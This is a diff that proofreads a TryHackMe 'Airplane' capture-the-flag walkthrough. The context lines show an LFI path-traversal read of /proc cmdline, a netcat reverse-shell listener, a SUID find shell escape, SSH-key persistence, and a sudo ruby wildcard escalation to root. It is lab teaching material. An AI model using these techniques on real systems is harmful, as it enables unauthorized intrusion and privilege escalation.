@@ -165,7 +165,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 61.52 seconds
 ```
 
-This port appears to run a service that couldn't be identified by Nmap. We can attempt to read the `cmdline` file of this process in the `proc` folder. We first need to identify which folder contains this process's informations. We can create a wordlist of process IDs that we can use to fuzz the file system using the LFI vulnerability we discoverd earlier.
+This port appears to run a service that couldn't be identified by Nmap. We can attempt to read the `cmdline` file of this process in the `proc` folder. We first need to identify which folder contains this process's information. We can create a wordlist of process IDs that we can use to fuzz the file system using the LFI vulnerability we discovered earlier.
 ```bash
 ┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
 └─$ seq 1 1000 > PIDs.txt 
@@ -179,7 +179,7 @@ This port appears to run a service that couldn't be identified by Nmap. We can a
 :: Progress: [1000/1000] :: Job [1/1] :: 70 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
 ```
 
-We can see that we access three processes on the target. We can read the `cmdline` file to enumerate the command use to start these processes. This file contain the NULL cahracter `\x00` at its end so we need to replace it with any other character e.g space  to see it contents.
+We can see that we access three processes on the target. We can read the `cmdline` file to enumerate the command used to start these processes. This file contains the NULL character `\x00` at its end so we need to replace it with any other character e.g. space to see its contents.
 ```bash
 ┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
 └─$ curl -s 'http://airplane.thm:8000/?page=../../../../proc/538/cmdline' | sed 's/\x00/ /g'
@@ -207,7 +207,7 @@ Saved as: binary.elf
 └─$ chmod 755 binary.elf  
 ```
 
-With the palyload set we can start a listener on our attack host.
+With the payload set, we can start a listener on our attack host.
 ```bash
 ┌──(pentester㉿kali)-[~/…/Challenge/Airplane/Scans/Web]
 └─$ nc -lvnp 1234
@@ -250,7 +250,7 @@ zsh: suspended  nc -lvnp 1234
 hudson@airplane:/opt$ 
 ```
 
-After we have obtain a shell on the target we can enumerate SUID binaries on the target system.
+After we have obtained a shell on the target we can enumerate SUID binaries on the target system.
 ```bash
 hudson@airplane:/home/hudson$ find / -perm -4000 2>/dev/null
 /usr/bin/find
@@ -261,7 +261,7 @@ hudson@airplane:/home/hudson$ ls -l /usr/bin/find
 -rwsr-xr-x 1 carlos carlos 320160 Feb 18  2020 /usr/bin/find
 ```
 
-We can see that the `/usr/bin/find` binary has the SUID bit set for the carlos user. We can run this command with the `-exec` option that allow us to run system command. This gives us a shell as carlos user and we can read the user flag on the system.
+We can see that the `/usr/bin/find` binary has the SUID bit set for the Carlos user. We can run this command with the `-exec` option that allows us to run a system command. This gives us a shell as carlos user and we can read the user flag on the system.
 ```bash
 hudson@airplane:/home/hudson$ /usr/bin/find . -exec /bin/sh -p \; -quit
 $ whoami
@@ -273,7 +273,7 @@ Documents  Music      Public    Videos
 
 ## Post Exploitation
 
-We can maintain this access by writing a public key we control in Carlos's `/home/carlos/.ssh/authorized_keys` files and connect to the target as the carlos user using SSH. We first create the private/public key pair on our attack host.
+We can maintain this access by writing a public key we control in Carlos's `/home/carlos/.ssh/authorized_keys` files and connecting to the target as the Carlos user using SSH. We first create the private/public key pair on our attack host.
 ```bash
 ┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
 └─$ ssh-keygen -t ed25519                 
@@ -296,7 +296,7 @@ Now we copy the contain of the `id_ed25519.pub` file we created to the `/home/ca
 $ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBh4WvTepAN44OAVrcLMr5Zvj1i6KuPXMXw+s31IYxoi pentester@kali'  > /home/carlos/.ssh/authorized_keys
 ```
 
-Finally we can connect to the target as Carlos using SSH.
+Finally, we can connect to the target as Carlos using SSH.
 ```bash
 ┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Airplane/Misc File]
 └─$ ssh carlos@10.10.158.63 -i id_ed25519 
@@ -317,7 +317,7 @@ User carlos may run the following commands on airplane:
     (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
 ```
 
-We can see that the user Carlos can run any Ruby file in the `/root` directory and we do not have write access on that directory. The wildcard `*` matches one or more occurrences of any character, including no character including `.` and `/`. We can use this to perform path traversal to execute a ruby script present in a directroy we control as root. We need a ruby script that gives us a shell as the root user.  
+We can see that the user Carlos can run any Ruby file in the `/root` directory and we do not have write access to that directory. The wildcard `*` matches one or more occurrences of any character, including no character including `.` and `/`. We can use this to perform path traversal to execute a ruby script present in a directory we control as root. We need a ruby script that gives us a shell as the root user.  
 ```bash
 carlos@airplane:~$ pwd
 /home/carlos
@@ -334,4 +334,4 @@ We have perform path travesal and executed the `sh` command as root which gave u
 
 ## Conclusion
 
-Congratulations! In this walkthrough, you have exploited an LFI vulnerability to enumerate the process using an unindentified GDBserver service which you use to obtain a reverse shell on the target. This machine was designed to show how inconsistent input validation when including files could seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
+Congratulations! In this walkthrough, you have exploited an LFI vulnerability to enumerate the process using an unidentified GDBserver service which you use to obtain a reverse shell on the target. This machine was designed to show how inconsistent input validation when including files could seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
